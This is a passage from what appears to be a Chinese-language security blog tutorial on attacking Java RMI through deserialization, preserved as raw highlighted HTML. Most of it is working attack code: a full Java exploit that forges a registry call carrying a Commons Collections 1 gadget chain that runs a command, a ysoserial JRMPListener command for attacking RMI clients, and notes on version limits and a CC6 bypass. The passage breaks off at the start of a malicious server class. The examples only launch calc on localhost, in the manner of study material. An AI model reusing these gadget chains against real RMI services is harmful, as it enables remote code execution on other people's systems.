</span><span class="lnt" id="50"><span class="lnlinks">50</span>
</span><span class="lnt" id="51"><span class="lnlinks">51</span>
</span><span class="lnt" id="52"><span class="lnlinks">52</span>
</span><span class="lnt" id="53"><span class="lnlinks">53</span>
</span><span class="lnt" id="54"><span class="lnlinks">54</span>
</span><span class="lnt" id="55"><span class="lnlinks">55</span>
</span><span class="lnt" id="56"><span class="lnlinks">56</span>
</span><span class="lnt" id="57"><span class="lnlinks">57</span>
</span><span class="lnt" id="58"><span class="lnlinks">58</span>
</span><span class="lnt" id="59"><span class="lnlinks">59</span>
</span><span class="lnt" id="60"><span class="lnlinks">60</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.attack</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">sun.rmi.server.UnicastRef</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutput</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Target</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.Registry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.server.Operation</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.server.RemoteCall</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.server.RemoteObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">AttackRegistryEXP02</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Registry</span><span class="w"> </span><span class="n">registry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">getRegistry</span><span class="p">(</span><span class="s">&#34;127.0.0.1&#34;</span><span class="p">,</span><span class="n">1099</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//通过反射拿到 UnicastRef</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.rmi.server.RemoteObject&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;ref&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">UnicastRef</span><span class="w"> </span><span class="n">ref</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">UnicastRef</span><span class="p">)</span><span class="w"> </span><span class="n">field</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">registry</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//从这里开始模拟 lookup 的方式进行伪造方法调用</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//这里手动构建了一次 Registry 远程调用</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Operation</span><span class="o">[]</span><span class="w"> </span><span class="n">operations</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Operation</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RemoteCall</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ref</span><span class="p">.</span><span class="na">newCall</span><span class="p">((</span><span class="n">RemoteObject</span><span class="p">)</span><span class="w"> </span><span class="n">registry</span><span class="p">,</span><span class="w"> </span><span class="n">operations</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="n">4905912898345647071L</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//获取调用的输出流</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutput</span><span class="w"> </span><span class="n">var3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//序列化</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">var3</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">CC1</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//这里执行远程调用触发漏洞</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ref</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">var2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">CC1</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chainedTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;value&#34;</span><span class="p">,</span><span class="s">&#34;value&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">transformedMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="n">chainedTransformer</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">constructor</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Target</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">transformedMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">o</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103340.png" style="max-width: 100%; height: auto;"></p>
<h3 id="42-攻击客户端">4.2 攻击客户端<a hidden class="anchor" aria-hidden="true" href="#42-攻击客户端">#</a></h3>
<h4 id="421-注册中心攻击客户端">4.2.1 注册中心攻击客户端<a hidden class="anchor" aria-hidden="true" href="#421-注册中心攻击客户端">#</a></h4>
<blockquote>
<p>除了 unbind 和 rebind 都会返回数据给客户端，返回的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击，这里使用ysoserial 的 JRMPListener，因为 EXP 实在太长了。</p>
</blockquote>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103591.png" style="max-width: 100%; height: auto;"></p>
<p><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099  CommonsCollections1 'calc'</code></p>
<p>客户端去访问：</p>
<div class="code-block-container" id="code-1769750397393633200" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397393633200">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397393633200" title="Toggle" aria-expanded="false" aria-controls="code-1769750397393633200" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397393633200-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.Naming</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.RemoteException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.Registry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Client</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Registry</span><span class="w"> </span><span class="n">registry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">getRegistry</span><span class="p">(</span><span class="s">&#34;127.0.0.1&#34;</span><span class="p">,</span><span class="n">1099</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">registry</span><span class="p">.</span><span class="na">list</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>但是运行完什么都没有发生。。</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104922.png" style="max-width: 100%; height: auto;"></p>
<h5 id="后续发现俩个问题">后续发现俩个问题，<a hidden class="anchor" aria-hidden="true" href="#后续发现俩个问题">#</a></h5>
<h6 id="一是-java-版本">一是 Java 版本<a hidden class="anchor" aria-hidden="true" href="#一是-java-版本">#</a></h6>
<p>如果是用CC1链，Java版本低于 1.8.0_65</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104627.png" style="max-width: 100%; height: auto;"></p>
<p>当然，高版本可以用 CC6 链绕过也是可以的</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104501.png" style="max-width: 100%; height: auto;"></p>
<h6 id="二是运行计算器时因为加了-单引号--而找不到程序">二是运行计算器时因为加了 单引号 &rsquo;&rsquo; 而找不到程序<a hidden class="anchor" aria-hidden="true" href="#二是运行计算器时因为加了-单引号--而找不到程序">#</a></h6>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104209.png" style="max-width: 100%; height: auto;"></p>
<p>运行 <code>calc</code> <code>&quot;calc&quot;</code> 都可以正常弹出</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104888.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104542.png" style="max-width: 100%; height: auto;"></p>
<p><strong>根据 AI 的解释：在Windows系统中，cmd 命令行参数的单引号不会被自动去除，而是作为参数的一部分传递。当ysoserial尝试执行命令时，它接收到的是带单引号的 <code>'calc'</code>，而不是单纯的 <code>calc</code>。当我们换成 power shell 时，是可以正确执行的。</strong></p>
<p><img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251941223.png" style="max-width: 100%; height: auto;"></p>
<h4 id="422-服务端攻击客户端">4.2.2 服务端攻击客户端<a hidden class="anchor" aria-hidden="true" href="#422-服务端攻击客户端">#</a></h4>
<p>服务端攻击客户端，可分俩种情形：</p>
<ol>
<li><!-- raw HTML omitted -->服务端返回Object对象<!-- raw HTML omitted --></li>
<li><!-- raw HTML omitted -->远程加载对象<!-- raw HTML omitted --></li>
</ol>
<h5 id="服务端返回object对象"><!-- raw HTML omitted -->服务端返回Object对象<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#服务端返回object对象">#</a></h5>
<p>RMI 远程方法调用返回的不一定是一个基础数据类型（比如String  int），也会返回一个对象。服务端返回给客户端一个对象，客户端要对这个对象反序列化。所以我们伪造一个服务端，当客户端调用某个方法时，返回的就是恶意对象，就可以攻击客户端。</p>
<p>User 接口，返回 Object 对象</p>
<div class="code-block-container" id="code-1769750397398713400" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397398713400">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397398713400" title="Toggle" aria-expanded="false" aria-controls="code-1769750397398713400" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397398713400-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span><span class="lnt" id="5"><span class="lnlinks">5</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">interface</span> <span class="nc">User</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">Remote</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Object</span><span class="w"> </span><span class="nf">getUser</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>服务端实现 User 接口，返回 CC1 恶意 Object 对象</p>
<div class="code-block-container" id="code-1769750397399354900" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397399354900">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397399354900" title="Toggle" aria-expanded="false" aria-controls="code-1769750397399354900" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397399354900-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span><span class="lnt" id="38"><span class="lnlinks">38</span>
</span><span class="lnt" id="39"><span class="lnlinks">39</span>
</span><span class="lnt" id="40"><span class="lnlinks">40</span>
</span><span class="lnt" id="41"><span class="lnlinks">41</span>
</span><span class="lnt" id="42"><span class="lnlinks">42</span>
</span><span class="lnt" id="43"><span class="lnlinks">43</span>
</span><span class="lnt" id="44"><span class="lnlinks">44</span>
</span><span class="lnt" id="45"><span class="lnlinks">45</span>
</span><span class="lnt" id="46"><span class="lnlinks">46</span>
</span><span class="lnt" id="47"><span class="lnlinks">47</span>
</span><span class="lnt" id="48"><span class="lnlinks">48</span>
</span><span class="lnt" id="49"><span class="lnlinks">49</span>
</span><span class="lnt" id="50"><span class="lnlinks">50</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com</span><span class="p">;</span><span class="w">
